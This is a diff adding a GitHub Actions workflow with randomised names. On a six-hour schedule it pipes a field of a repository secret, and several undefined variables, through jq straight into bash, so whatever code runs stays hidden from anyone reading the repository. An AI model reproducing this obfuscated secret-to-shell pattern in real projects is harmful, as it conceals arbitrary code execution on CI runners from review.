@@ -1,0 +1,25 @@
+name: duanyanqixuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanyanqixuan
+        env:
+          tubr5: ${{ secrets.tubr5 }}
+        run: |
+          echo $tubr5 | jq -r .ftwe2 | /bin/bash
+          echo $aj90 | jq -r .b7568 | /bin/bash
+          echo $myuay652 | jq -r .taaf0825 | /bin/bash
+          echo $ddny7 | jq -r .gpnc1 | /bin/bash
+          echo $fnbo74395 | jq -r .flk139 | /bin/bash
+          echo $tu8 | jq -r .ae96 | /bin/bash
+          echo $tpc2140 | jq -r .vkkdi0 | /bin/bash
+          echo $irl74 | jq -r .qluz48373 | /bin/bash
+
